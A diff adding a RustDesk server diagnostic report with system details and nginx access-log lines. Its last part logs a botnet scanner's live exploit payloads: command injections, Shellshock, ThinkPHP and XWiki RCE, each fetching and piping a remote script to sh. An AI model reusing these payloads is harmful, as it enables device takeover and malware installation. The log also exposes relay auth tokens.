@@ -1,0 +1,379 @@
+============================================================
+Provision Claim Diagnostic - /api/provision/claim
+Timestamp (UTC): 2025-12-18T02:35:05Z
+Host: remote-srv
+Repository root: /opt/rustdesk-frontend
+Code under test: 3126
+============================================================
+
+### 1. System Information
+uname -a:
+Linux remote-srv 5.15.0-164-generic #174-Ubuntu SMP Fri Nov 14 20:25:16 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
+
+lsb_release -a (if available):
+No LSB modules are available.
+Distributor ID:	Ubuntu
+Description:	Ubuntu 22.04.5 LTS
+Release:	22.04
+Codename:	jammy
+
+Current user: root
+Current working directory: /opt/rustdesk-frontend
+
+### 2. systemd services matching rustdesk/frontend/api/node/next
+  kmod-static-nodes.service                      loaded    active     exited       Create List of Static Device Nodes
+  rustdesk-frontend.service                      loaded    active     running      RustDesk Web Frontend
+  rustdesk-hbbr.service                          loaded    active     running      RustDesk Relay Server (hbbr)
+  rustdesk-hbbs.service                          loaded    active     running      RustDesk ID/Rendezvous Server (hbbs)
+  rustdesk-sync-api.service                      loaded    activating auto-restart RustDesk Sync API - On-demand device synchronization
+  systemd-tmpfiles-setup-dev.service             loaded    active     exited       Create Static Device Nodes in /dev
+
+### 2.1 No specific frontend service detected (rustdesk-frontend.service / rustdeskweb.service not found)
+
+### 3. NGINX configuration for rustdesk.bwb.pt
+nginx -T | grep -n 'server_name rustdesk.bwb.pt'
+------------------------------------------------------------
+258:    server_name rustdesk.bwb.pt;
+265:    server_name rustdesk.bwb.pt;
+
+### 4. NGINX access/error logs around /api/provision/claim
+Access log path: /var/log/nginx/access.log
+
+Last 50 lines containing '/api/provision/claim' in access.log:
+------------------------------------------------------------
+No matching lines for /api/provision/claim.
+
+Last 200 lines from access.log:
+------------------------------------------------------------
+102.211.11.65 - - [18/Dec/2025:01:44:04 +0000] "GET /scripts/chartjs-adapter-moment.js HTTP/2.0" 200 2512 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0"
+102.211.11.65 - - [18/Dec/2025:01:44:04 +0000] "GET /scripts/filesaver.min.js HTTP/2.0" 200 2565 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0"
+102.211.11.65 - - [18/Dec/2025:01:44:04 +0000] "GET /scripts/ol3-contextmenu.js HTTP/2.0" 200 11404 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0"
+102.211.11.65 - - [18/Dec/2025:01:44:04 +0000] "GET /scripts/jquery.js HTTP/2.0" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0"
+102.211.11.65 - - [18/Dec/2025:01:44:04 +0000] "GET /scripts/purify.js HTTP/2.0" 200 65343 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0"
+102.211.11.65 - - [18/Dec/2025:01:44:04 +0000] "GET /scripts/bootstrap.js HTTP/2.0" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0"
+102.211.11.65 - - [18/Dec/2025:01:44:04 +0000] "GET /scripts/fontawesome/all.js HTTP/2.0" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0"
+102.211.11.65 - - [18/Dec/2025:01:44:04 +0000] "GET /scripts/select2.full.min.js HTTP/2.0" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0"
+102.211.11.65 - - [18/Dec/2025:01:44:04 +0000] "GET /scripts/themes/theme-switcher.js HTTP/2.0" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0"
+102.211.11.65 - - [18/Dec/2025:01:44:04 +0000] "GET /scripts/moment.js HTTP/2.0" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0"
+102.211.11.65 - - [18/Dec/2025:01:44:04 +0000] "GET /scripts/ol.js HTTP/2.0" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0"
+102.211.11.65 - - [18/Dec/2025:01:44:04 +0000] "GET /scripts/custom.js HTTP/2.0" 200 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0"
+102.211.11.65 - - [18/Dec/2025:01:44:04 +0000] "GET /scripts/marked.js HTTP/2.0" 200 103416 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0"
+102.211.11.65 - - [18/Dec/2025:01:44:05 +0000] "GET /images/user-256.png HTTP/2.0" 200 19435 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0"
+102.211.11.65 - - [18/Dec/2025:01:44:05 +0000] "GET /images/info.png HTTP/2.0" 200 4882 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0"
+102.211.11.65 - - [18/Dec/2025:01:44:05 +0000] "GET /serverpic.ashx HTTP/2.0" 200 71416 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0"
+102.211.11.65 - - [18/Dec/2025:01:44:05 +0000] "GET /commander.ashx HTTP/2.0" 200 230682 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0"
+102.211.11.65 - - [18/Dec/2025:01:44:05 +0000] "GET /images/details/graph64.png HTTP/2.0" 200 7643 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0"
+102.211.11.65 - - [18/Dec/2025:01:44:05 +0000] "GET /images/webp/user-256.webp HTTP/2.0" 200 4812 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0"
+102.211.11.65 - - [18/Dec/2025:01:44:05 +0000] "GET /images/webp/group-256.webp HTTP/2.0" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0"
+102.211.11.65 - - [18/Dec/2025:01:44:05 +0000] "GET /images/webp/mesh-256.webp HTTP/2.0" 200 22088 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0"
+102.211.11.65 - - [18/Dec/2025:01:44:06 +0000] "GET /favicon-303x303.png HTTP/2.0" 499 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0"
+102.211.11.65 - - [18/Dec/2025:01:44:06 +0000] "GET /favicon.ico HTTP/2.0" 499 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0"
+102.211.11.65 - - [18/Dec/2025:01:44:06 +0000] "GET /logo.png HTTP/2.0" 200 21683 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0"
+102.211.11.65 - - [18/Dec/2025:01:44:07 +0000] "GET /images/mail12.png HTTP/2.0" 200 3269 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0"
+102.211.11.65 - - [18/Dec/2025:01:44:07 +0000] "GET /images/icon-chat.png HTTP/2.0" 200 5739 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0"
+102.211.11.65 - - [18/Dec/2025:01:44:07 +0000] "GET /images/icon-notify.png HTTP/2.0" 200 3382 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0"
+102.211.11.65 - - [18/Dec/2025:01:44:07 +0000] "GET /images/icons32.png HTTP/2.0" 200 14646 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0"
+102.211.11.65 - - [18/Dec/2025:01:44:07 +0000] "GET /images/trash.png HTTP/2.0" 200 3068 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0"
+102.211.11.65 - - [18/Dec/2025:01:44:07 +0000] "GET /images/images16.png HTTP/2.0" 200 6503 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0"
+102.211.11.65 - - [18/Dec/2025:01:44:08 +0000] "GET /control.ashx HTTP/1.1" 101 53151 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0"
+188.250.60.132 - - [18/Dec/2025:01:44:30 +0000] "GET /agent.ashx HTTP/1.1" 101 317 "-" "MeshAgent 2025-Mar-6 21:44:07+0000"
+98.97.72.42 - - [18/Dec/2025:01:45:19 +0000] "GET /agent.ashx HTTP/1.1" 101 650773 "-" "MeshAgent 2025-Mar-6 21:44:07+0000"
+142.171.77.234 - - [18/Dec/2025:01:45:25 +0000] "GET http://checkip.amazonaws.com/ HTTP/1.1" 301 178 "-" "-"
+98.97.72.42 - - [18/Dec/2025:01:45:33 +0000] "GET /images/link5.png HTTP/2.0" 200 5975 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36"
+98.97.72.42 - - [18/Dec/2025:01:45:33 +0000] "GET /images/icons256-1-1.png HTTP/2.0" 200 58356 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36"
+98.97.72.42 - - [18/Dec/2025:01:45:43 +0000] "GET /images/details/software64.png HTTP/2.0" 200 5398 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36"
+98.97.72.42 - - [18/Dec/2025:01:45:43 +0000] "GET /images/details/meshagent64.png HTTP/2.0" 200 13815 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36"
+98.97.72.42 - - [18/Dec/2025:01:45:43 +0000] "GET /images/details/amt64.png HTTP/2.0" 200 10289 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36"
+34.133.181.28 - - [18/Dec/2025:01:45:55 +0000] "GET http://worldtimeapi.org/api/timezone/Europe/London HTTP/1.1" 301 178 "-" "-"
+34.133.181.28 - - [18/Dec/2025:01:45:55 +0000] "CONNECT worldtimeapi.org:443 HTTP/1.1" 400 166 "-" "-"
+98.97.72.42 - - [18/Dec/2025:01:46:03 +0000] "GET /images/trash.png HTTP/2.0" 200 3068 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36"
+98.97.72.42 - - [18/Dec/2025:01:46:15 +0000] "GET /meshrelay.ashx?browser=1&p=2&nodeid=node//vaBzzrpXWK1d3chbyyUO@qTTuwoJXhtY19R22j10bxpcPiv1V7trPJ6lzBTiak54&id=juoirmyzel&auth=6c89b2df05f067a4ac6858636e11abd054ee5939e5164460b172a520430e954ca4ead4f814978ada120d1e81c43d9b1c1169f6d1f483f1f8aa59db5a834413d1b7ea6149b8158c86538ea9274cc95b85519eec83e759466e6715c05c7263bda7519b2345c735634afd12cd509fc551fed8a32d6e HTTP/1.1" 101 1087345 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36"
+98.97.72.42 - - [18/Dec/2025:01:46:15 +0000] "GET /meshrelay.ashx?p=2&nodeid=node//vaBzzrpXWK1d3chbyyUO%40qTTuwoJXhtY19R22j10bxpcPiv1V7trPJ6lzBTiak54&id=juoirmyzel&rauth=b7cb75ede3b152346d413a1b18bc6eec84ac7f1e6fb2bc52b8daa94ce8a20a2bea0249dd91ff0326bf2c126a0ca83c5e29bb52b08b781f8a36d9f92d57d503bf54ecc9d89a3ab623c0730ae7523fdada3aaf30b3273ef3670745d369917c02ebe8a2ca HTTP/1.1" 101 524 "-" "-"
+98.97.72.42 - - [18/Dec/2025:01:46:33 +0000] "GET /images/link5.png HTTP/2.0" 200 5975 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0"
+98.97.72.42 - - [18/Dec/2025:01:46:33 +0000] "GET /images/icons256-1-1.png HTTP/2.0" 200 58356 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0"
+188.250.60.132 - - [18/Dec/2025:01:46:36 +0000] "GET /agent.ashx HTTP/1.1" 101 355 "-" "MeshAgent 2025-Mar-6 21:44:07+0000"
+98.97.72.42 - - [18/Dec/2025:01:46:47 +0000] "GET /meshrelay.ashx?browser=1&p=2&nodeid=node//XFePSiP54$Zu2iaF7jwRh0M349muJ00Fe0GB33nZrlTqzwUtDE7ES3fHrsjITUvW&id=pyjattt70w9&auth=2c7c8b0185e0eeab222e650ba38bfa9167974e6b503322335903d9f43663937da8239157cf4e0eb2b121849be2f7cbaacbcfe03d4861896bb9b635a79c9dcafefbb5c6e7651698a0efe4a5b9be483c4ca446b5b9d76361ccdd65fc61d842fba2a9c9090c6a860cf116d92a43a4bf63de3e4d8556189e HTTP/1.1" 101 74388 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0"
+38.44.67.90 - - [18/Dec/2025:01:46:47 +0000] "GET /meshrelay.ashx?p=2&nodeid=node//XFePSiP54%24Zu2iaF7jwRh0M349muJ00Fe0GB33nZrlTqzwUtDE7ES3fHrsjITUvW&id=pyjattt70w9&rauth=ab58f06c024bbdd86523732cf23ae07da2839b8e35ec94e26d2cc477302bd139e6908b0c4afb5f70291d3d76b17ff86e86f4ef749af998bb52398741de784de1e71b35627694573f73a139459f1b816f7477afc9f892d41d325a6a198495da981a9d058e61 HTTP/1.1" 101 2212 "-" "-"
+98.97.72.42 - - [18/Dec/2025:01:46:49 +0000] "GET /images/details/software64.png HTTP/2.0" 200 5398 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0"
+98.97.72.42 - - [18/Dec/2025:01:46:49 +0000] "GET /images/details/meshagent64.png HTTP/2.0" 200 13815 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0"
+3.237.43.197 - - [18/Dec/2025:01:47:26 +0000] "GET http://endpoint.clearproxy.io/get HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36"
+3.237.43.197 - - [18/Dec/2025:01:47:28 +0000] "\x16\x03\x01\x01q\x01\x00\x01m\x03\x03\xFF\xB7\xFBdg\xCA\x07dL\xB1\xD7\xE9\xBE\xE6\x18\xD6Jm\x96\xC3\xE1\xC4\xD6\x1A\xF1\xCF\xD0y\x1A\xE3\x97< \xD5P\x18d\x18\xE5\x92b\xBA2\x0B\xDE.\xF1L\xB1X\x84\xED\xEA 9i\xBF\xD6\x84\xA8@\x818\xDD\xCE\x00j\x13\x02\x13\x03\x13\x01\xC0/\xC0+\xC00\xC0,\x00\x9E\xC0'\x00g\xC0(\x00k\x00\xA3\x00\x9F\xCC\xA9\xCC\xA8\xCC\xAA\xC0\xAD\xC0\x9F\xC0]\xC0a\xC0W\xC0S\x00\xA2\xC0\xAC\xC0\x9E\xC0\x5C\xC0`\xC0V\xC0R\xC0$\x00j\xC0#\x00@\xC0" 400 166 "-" "-"
+188.250.60.132 - - [18/Dec/2025:01:47:39 +0000] "GET /agent.ashx HTTP/1.1" 101 317 "-" "MeshAgent 2025-Mar-6 21:44:07+0000"
+98.97.72.42 - - [18/Dec/2025:01:48:34 +0000] "GET /images/trash.png HTTP/2.0" 200 3068 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0"
+34.132.154.86 - - [18/Dec/2025:01:49:12 +0000] "GET http://worldtimeapi.org/api/timezone/Europe/London HTTP/1.1" 301 178 "-" "-"
+34.132.154.86 - - [18/Dec/2025:01:49:12 +0000] "CONNECT worldtimeapi.org:443 HTTP/1.1" 400 166 "-" "-"
+98.97.72.42 - - [18/Dec/2025:01:49:14 +0000] "GET /meshrelay.ashx?browser=1&p=2&nodeid=node//zjL6eDuIIviLNkL4nZWwamaE5kFgS242mAhfOVKu0UPXQEbEjO3MXTq2PbmmPA$g&id=c1srxn4hwzn&auth=2c7c8b0185e0eeab222e650ba38bfa9167974e6b503322335903d9f43663937da8239157cf4e0eb2b121849be2f7cbaacbcfe03d4861896bb9b635a79c9dcafefbb5c6e7651698a0efe4a5b9be483c4ca446b5b9d76361ccdd65fc61d842fba2a9c9090c6a860cf116d92a43a4bf63de3e4d8556189e HTTP/1.1" 101 368575 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0"
+154.203.66.61 - - [18/Dec/2025:01:49:14 +0000] "GET /meshrelay.ashx?p=2&nodeid=node//zjL6eDuIIviLNkL4nZWwamaE5kFgS242mAhfOVKu0UPXQEbEjO3MXTq2PbmmPA%24g&id=c1srxn4hwzn&rauth=ab58f06c024bbdd86523732cf23ae07da2839b8e35ec94e26d2cc477302bd139e6908b0c4afb5f70291d3d76b17ff86e86f4ef749af998bb52398741de784de1e71b35627694573f73a139459f1b816f7477afc9f892d41d325a6a198495da981a9d058e61 HTTP/1.1" 101 2420 "-" "-"
+98.97.72.42 - - [18/Dec/2025:01:49:15 +0000] "GET /images/details/amt64.png HTTP/2.0" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0"
+98.97.72.42 - - [18/Dec/2025:01:49:19 +0000] "GET /images/images16.png HTTP/2.0" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0"
+98.97.72.42 - - [18/Dec/2025:01:49:24 +0000] "GET /images/link1.png HTTP/2.0" 200 165 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0"
+98.97.72.42 - - [18/Dec/2025:01:49:24 +0000] "GET /images/icon-addnew.png HTTP/2.0" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0"
+188.250.60.132 - - [18/Dec/2025:01:49:46 +0000] "GET /agent.ashx HTTP/1.1" 101 355 "-" "MeshAgent 2025-Mar-6 21:44:07+0000"
+188.250.60.132 - - [18/Dec/2025:01:50:18 +0000] "GET /agent.ashx HTTP/1.1" 101 298 "-" "MeshAgent 2025-Mar-6 21:44:07+0000"
+192.159.99.95 - - [18/Dec/2025:01:52:03 +0000] "POST / HTTP/1.1" 301 0 "-" "Mozilla/5.0 (rondo2012@atomicmail.io)"
+192.159.99.95 - - [18/Dec/2025:01:52:03 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=%60busybox%20wget%20-qO-%20http%3A%2F%2F41.231.37.153%2Frondo.zqq.sh%7Csh%60 HTTP/1.1" 301 178 "-" "Mozilla/5.0 (rondo2012@atomicmail.io)"
+192.159.99.95 - - [18/Dec/2025:01:52:03 +0000] "GET /goform/webRead/open/?path=%7Cwget%20-qO-%20http%3A%2F%2F41.231.37.153%2Frondo.wtf.sh%7Csh HTTP/1.0" 301 178 "-" "Mozilla/5.0 (rondo2012@atomicmail.io)"
+192.159.99.95 - - [18/Dec/2025:01:52:03 +0000] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 178 "-" "Mozilla/5.0 (rondo2012@atomicmail.io)"
+192.159.99.95 - - [18/Dec/2025:01:52:03 +0000] "POST /wls-wsat/CoordinatorPortType HTTP/1.1" 301 0 "-" "Mozilla/5.0 (rondo2012@atomicmail.io)"
+192.159.99.95 - - [18/Dec/2025:01:52:03 +0000] "GET /index.php?s=/Index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=%28wget%20-qO-%20http%3A%2F%2F41.231.37.153%2Frondo.txg.sh%7C%7Cbusybox%20wget%20-qO-%20http%3A%2F%2F41.231.37.153%2Frondo.txg.sh%7C%7Ccurl%20-s%20http%3A%2F%2F41.231.37.153%2Frondo.txg.sh%29%7Csh HTTP/1.1" 301 178 "-" "Mozilla/5.0 (rondo2012@atomicmail.io)"
+192.159.99.95 - - [18/Dec/2025:01:52:03 +0000] "GET /public/index.php?s=/Index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=%28wget%20-qO-%20http%3A%2F%2F41.231.37.153%2Frondo.txg.sh%7C%7Cbusybox%20wget%20-qO-%20http%3A%2F%2F41.231.37.153%2Frondo.txg.sh%7C%7Ccurl%20-s%20http%3A%2F%2F41.231.37.153%2Frondo.txg.sh%29%7Csh HTTP/1.1" 301 0 "-" "Mozilla/5.0 (rondo2012@atomicmail.io)"
+192.159.99.95 - - [18/Dec/2025:01:52:03 +0000] "POST /index.php?s=captcha HTTP/1.1" 301 0 "-" "Mozilla/5.0 (rondo2012@atomicmail.io)"
+192.159.99.95 - - [18/Dec/2025:01:52:03 +0000] "POST /cgi-bin/login.cgi HTTP/1.0" 301 178 "-" "Mozilla/5.0 (rondo2012@atomicmail.io)"
+192.159.99.95 - - [18/Dec/2025:01:52:03 +0000] "POST /apply_sec.cgi HTTP/1.1" 301 0 "http://46.101.78.179/login_pic.asp" "Mozilla/5.0 (rondo2012@atomicmail.io)"
+192.159.99.95 - - [18/Dec/2025:01:52:04 +0000] "POST /goform/formJsonAjaxReq HTTP/1.1" 301 178 "http://46.101.78.179/home.asp" "Mozilla/5.0 (rondo2012@atomicmail.io)"
+192.159.99.95 - - [18/Dec/2025:01:52:04 +0000] "POST /boafrm/formSysCmd HTTP/1.1" 301 178 "-" "Mozilla/5.0 (rondo2012@atomicmail.io)"
+192.159.99.95 - - [18/Dec/2025:01:52:04 +0000] "POST /boardDataWW.php HTTP/1.1" 301 0 "http://46.101.78.179/boardDataWW.php" "Mozilla/5.0 (rondo2012@atomicmail.io)"
+192.159.99.95 - - [18/Dec/2025:01:52:04 +0000] "GET /PictureCatch.cgi?username=GEOVISION&password=%3Bbusybox%20wget%20-qO-%20http%3A%2F%2F41.231.37.153%2Frondo.vgz.sh%7Csh%3B&data_type=1&attachment=1&channel=1&secret=1&key=PWNED HTTP/1.1" 301 178 "-" "Mozilla/5.0 (rondo2012@atomicmail.io)"
+192.159.99.95 - - [18/Dec/2025:01:52:04 +0000] "POST /GponForm/diag_Form?images/ HTTP/1.1" 301 178 "-" "Mozilla/5.0 (rondo2012@atomicmail.io)"
+192.159.99.95 - admin [18/Dec/2025:01:52:04 +0000] "POST /apply.cgi HTTP/1.1" 301 0 "http://46.101.78.179/system.html" "Mozilla/5.0 (rondo2012@atomicmail.io)"
+192.159.99.95 - ffadmin [18/Dec/2025:01:52:04 +0000] "POST /apply.cgi HTTP/1.1" 301 178 "http://46.101.78.179/apply.cgi" "Mozilla/5.0 (rondo2012@atomicmail.io)"
+192.159.99.95 - ffadmin [18/Dec/2025:01:52:04 +0000] "POST /apply.cgi HTTP/1.1" 301 178 "http://46.101.78.179/apply.cgi" "Mozilla/5.0 (rondo2012@atomicmail.io)"
+192.159.99.95 - root [18/Dec/2025:01:52:04 +0000] "POST /dvr/cmd HTTP/1.1" 301 178 "-" "Mozilla/5.0 (rondo2012@atomicmail.io)"
+192.159.99.95 - - [18/Dec/2025:01:52:04 +0000] "GET / HTTP/1.1" 301 0 "-" "() { :; }; /bin/bash -c \x22(wget -qO- http://41.231.37.153/rondo.qre.sh||busybox wget -qO- http://41.231.37.153/rondo.qre.sh||curl -s http://41.231.37.153/rondo.qre.sh)|sh\x22& # rondo2012@atomicmail.io"
+192.159.99.95 - admin [18/Dec/2025:01:52:04 +0000] "POST /goform/SystemCommand HTTP/1.1" 301 178 "-" "Mozilla/5.0 (rondo2012@atomicmail.io)"
+192.159.99.95 - - [18/Dec/2025:01:52:04 +0000] "GET /cgi-bin/shortcut_telnet.cgi?wget%20-qO-%20http%3A%2F%2F41.231.37.153%2Frondo.wyu.sh%7Csh%26 HTTP/1.1" 301 178 "-" "Mozilla/5.0 (rondo2012@atomicmail.io)"
+192.159.99.95 - admin [18/Dec/2025:01:52:04 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=busybox%20wget%20-qO-%20http%3A%2F%2F41.231.37.153%2Frondo.ush.sh%7Csh%26&curpath=%2F&currentsetting.htm=1 HTTP/1.1" 301 178 "-" "Mozilla/5.0 (rondo2012@atomicmail.io)"
+192.159.99.95 - admin [18/Dec/2025:01:52:04 +0000] "POST /cgi-bin/cgi_main.cgi HTTP/1.1" 301 0 "http://46.101.78.179/cfg_system_time.htm" "Mozilla/5.0 (rondo2012@atomicmail.io)"
+192.159.99.95 - admin [18/Dec/2025:01:52:05 +0000] "POST /cgi-bin/server/server.cgi?func=server02_main_submit&counter=5.22497857400916&TEST_BTN4= HTTP/1.1" 301 178 "http://46.101.78.179/cgi-bin/server/server.cgi?func=server02_main_submit&counter=6.7496022225883&TEST_BTN4=" "Mozilla/5.0 (rondo2012@atomicmail.io)"
+192.159.99.95 - - [18/Dec/2025:01:52:05 +0000] "GET /cgi-bin/iptest.cgi?cmd=iptest.cgi&-time=1504225666237&-url=%60busybox%20wget%20-qO-%20http%3A%2F%2F41.231.37.153%2Frondo.eby.sh%7Csh%60 HTTP/1.1" 301 178 "-" "Mozilla/5.0 (rondo2012@atomicmail.io)"
+192.159.99.95 - admin [18/Dec/2025:01:52:05 +0000] "POST /goform/mp HTTP/1.1" 301 178 "-" "Mozilla/5.0 (rondo2012@atomicmail.io)"
+192.159.99.95 - - [18/Dec/2025:01:52:05 +0000] "POST /cgi-bin/system_mgr.cgi? HTTP/1.1" 301 0 "-" "Mozilla/5.0 (rondo2012@atomicmail.io)"
+192.159.99.95 - - [18/Dec/2025:01:52:05 +0000] "GET /cgi-bin/account_mgr.cgi?cmd=cgi_user_add&name=%27%3Bwget%20-qO-%20http%3A%2F%2F41.231.37.153%2Frondo.djc.sh%7Csh%3B%27 HTTP/1.1" 301 178 "-" "Mozilla/5.0 (rondo2012@atomicmail.io)"
+192.159.99.95 - - [18/Dec/2025:01:52:05 +0000] "POST /goform/Mail_Test HTTP/1.0" 301 178 "-" "Mozilla/5.0 (rondo2012@atomicmail.io)"
+192.159.99.95 - - [18/Dec/2025:01:52:05 +0000] "GET /cgi-bin/;wget${IFS}-qO-${IFS}http://41.231.37.153/rondo.sbx.sh|sh&echo${IFS} HTTP/1.0" 301 178 "-" "Mozilla/5.0 (rondo2012@atomicmail.io)"
+192.159.99.95 - - [18/Dec/2025:01:52:05 +0000] "GET /HNAP1/ HTTP/1.1" 301 0 "-" "Mozilla/5.0 (rondo2012@atomicmail.io)"
+192.159.99.95 - - [18/Dec/2025:01:52:05 +0000] "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=busybox%20wget%20-qO-%20http%3A%2F%2F41.231.37.153%2Frondo.ebj.sh%7Csh%26echo%20 HTTP/1.0" 301 0 "-" "Mozilla/5.0 (rondo2012@atomicmail.io)"
+192.159.99.95 - - [18/Dec/2025:01:52:05 +0000] "GET /setup.cgi?todo=funjsq_login&funjsq_access_token=12345|busybox%20wget%20-qO-%20http%3A%2F%2F41.231.37.153%2Frondo.fep.sh%7Csh%0A&test=11%00currentsetting.htm HTTP/1.1" 301 178 "-" "Mozilla/5.0 (rondo2012@atomicmail.io)"
+192.159.99.95 - - [18/Dec/2025:01:52:05 +0000] "POST /cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh HTTP/1.1" 400 166 "-" "-"
+192.159.99.95 - - [18/Dec/2025:01:52:05 +0000] "GET /xwiki/bin/get/Main/SolrSearch?media=rss&text=%7D%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7D%5B%27sh%27%2C%20%27-c%27%2C%20%27%28wget%20-qO-%20http%3A%2F%2F41.231.37.153%2Frondo.sdu.sh%7C%7Cbusybox%20wget%20-qO-%20http%3A%2F%2F41.231.37.153%2Frondo.sdu.sh%7C%7Ccurl%20-s%20http%3A%2F%2F41.231.37.153%2Frondo.sdu.sh%29%7Csh%27%5D.execute%28%29.text%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D HTTP/1.1" 301 0 "-" "Mozilla/5.0 (rondo2012@atomicmail.io)"
+192.159.99.95 - - [18/Dec/2025:01:52:05 +0000] "POST /user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax HTTP/1.1" 301 0 "-" "Mozilla/5.0 (rondo2012@atomicmail.io)"
